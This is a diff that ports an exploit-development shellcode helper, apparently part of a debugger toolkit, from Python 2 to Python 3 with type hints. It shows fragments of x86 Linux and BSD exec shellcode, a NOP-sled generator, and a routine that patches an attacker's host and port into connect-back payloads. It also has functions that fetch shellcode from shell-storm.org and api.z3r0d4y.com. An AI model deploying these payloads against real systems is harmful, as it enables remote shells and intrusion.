@@ -6,36 +6,27 @@
 #       License: see LICENSE file for details
 #
 
-from __future__ import absolute_import
-from __future__ import division
-from __future__ import print_function
+from typing import Any
 
 import random
 import socket
 import struct
 import traceback
-import six.moves.http_client
-from six.moves import range
-import sys
+import http.client
 
 import config
 from utils import msg, error_msg
 
-if sys.version_info.major == 3:
-    from urllib.request import urlopen
-    from urllib.parse import urlencode
-    pyversion = 3
-else:
-    from urllib import urlopen
-    from urllib import urlencode
-    pyversion = 2
+from urllib.request import urlopen
+from urllib.parse import urlencode
 
-def _make_values_bytes(dict_):
+
+def _make_values_bytes(dict_: dict[str, str]) -> dict[str, bytes]:
     """Make shellcode in dictionaries bytes"""
-    return {k: six.b(v) for k, v in dict_.items()}
+    return {k: v.encode('latin-1') for k, v in dict_.items()}
 
 
-shellcode_x86_linux = _make_values_bytes({
+shellcode_x86_linux: dict[str, bytes] = _make_values_bytes({
     "exec": (
         "\x31\xc0"               # 0x00000000:     xor eax,eax
         "\x50"                   # 0x00000002:     push eax
@@ -141,7 +132,7 @@ shellcode_x86_linux = _make_values_bytes({
     )
 })
 
-shellcode_x86_bsd = _make_values_bytes({
+shellcode_x86_bsd: dict[str, bytes] = _make_values_bytes({
     "exec": (
         "\x31\xc0"               # 0x00000000:     xor eax,eax
         "\x50"                   # 0x00000002:     push eax
@@ -232,23 +223,23 @@ shellcode_x86_bsd = _make_values_bytes({
 })
 
 
-shellcode_x86 = {"linux": shellcode_x86_linux, "bsd": shellcode_x86_bsd}
+shellcode_x86: dict[str, dict[str, bytes]] = {"linux": shellcode_x86_linux, "bsd": shellcode_x86_bsd}
 
-SHELLCODES = {"x86": shellcode_x86}
+SHELLCODES: dict[str, dict[str, dict[str, bytes]]] = {"x86": shellcode_x86}
 
 class Shellcode():
     """
     Simple wrapper for pre-defined shellcodes generation
     For complete and advanced shellcodes, Metasploit is recommended
     """
-    def __init__(self, arch="x86", platform="linux"):
+    def __init__(self, arch: str = "x86", platform: str = "linux") -> None:
         if arch in SHELLCODES and platform in SHELLCODES[arch]:
-            self.shellcodes = SHELLCODES[arch][platform].copy()
+            self.shellcodes: dict[str, bytes] | None = SHELLCODES[arch][platform].copy()
         else:
             self.shellcodes = None
 
     @staticmethod
-    def gennop(size, NOPS=None):
+    def gennop(size: int, NOPS: str | None = None) -> str:
         """
         genNOP is used to create an arbitrary length NOP sled using characters of your choosing.
         Perhaps you prefer \x90, perhaps you like the defaults. Given a list of NOP characters,
@@ -281,7 +272,7 @@ class Shellcode():
             sled += NOPS[N]
         return sled
 
-    def shellcode(self, sctype, port=None, host=None):
+    def shellcode(self, sctype: str, port: int | None = None, host: str | None = None) -> bytes | None:
         if not self.shellcodes or sctype not in self.shellcodes:
             return None
 
@@ -292,10 +283,10 @@ class Shellcode():
 
         shellcode = self.shellcodes[sctype]
         try:
-            port = struct.pack(">H", port)
+            port_bytes = struct.pack(">H", port)
             addr = socket.inet_aton(host)
-            shellcode = shellcode.replace(b"\x66\x68\x41\x42", b"\x66\x68" + port)
-            shellcode = shellcode.replace(b"\x68\xff\x02\x41\x42", b"\x68\xff\x02" + port)
+            shellcode = shellcode.replace(b"\x66\x68\x41\x42", b"\x66\x68" + port_bytes)
+            shellcode = shellcode.replace(b"\x68\xff\x02\x41\x42", b"\x68\xff\x02" + port_bytes)
             shellcode = shellcode.replace(b"\x68\x7f\x7f\x7f\x7f", b"\x68" + addr)
             return shellcode
         except Exception as e:
@@ -305,12 +296,12 @@ class Shellcode():
             return None
 
     """ search() and display() use the shell-storm API """
-    def search(self, keyword):
+    def search(self, keyword: str) -> list[dict[str, str]] | None:
         if keyword is None:
             return None
         try:
             msg("Connecting to shell-storm.org...")
-            s = six.moves.http_client.HTTPConnection("shell-storm.org")
+            s = http.client.HTTPConnection("shell-storm.org")
 
             s.request("GET", "/api/?s="+str(keyword))
             res = s.getresponse()
@@ -342,13 +333,13 @@ class Shellcode():
 
         return data_dl
 
-    def display(self, shellcodeId):
+    def display(self, shellcodeId: Any) -> str | None:
         if shellcodeId is None:
             return None
 
         try:
             msg("Connecting to shell-storm.org...")
-            s = six.moves.http_client.HTTPConnection("shell-storm.org")
+            s = http.client.HTTPConnection("shell-storm.org")
         except:
             error_msg("Cannot connect to shell-storm.org")
             return None
@@ -367,7 +358,7 @@ class Shellcode():
         data = data.replace("&gt;", ">")
         return data
     #OWASP ZSC API Z3r0D4y.Com
-    def zsc(self,os,job,encode):
+    def zsc(self, os: str, job: str, encode: str) -> str | None:
         try:
             msg('Connection to OWASP ZSC API api.z3r0d4y.com')
             params = urlencode({
@@ -376,8 +367,7 @@ class Shellcode():
                     'job': job,
                     'encode': encode})
             shellcode = urlopen("http://api.z3r0d4y.com/index.py?%s\n"%(str(params))).read()
-            if pyversion == 3:
-                shellcode = str(shellcode,encoding='ascii')
+            shellcode = shellcode.decode('ascii')
             return '\n"'+shellcode.replace('\n','')+'"\n'
         except:
             error_msg("Error while connecting to api.z3r0d4y.com ...")
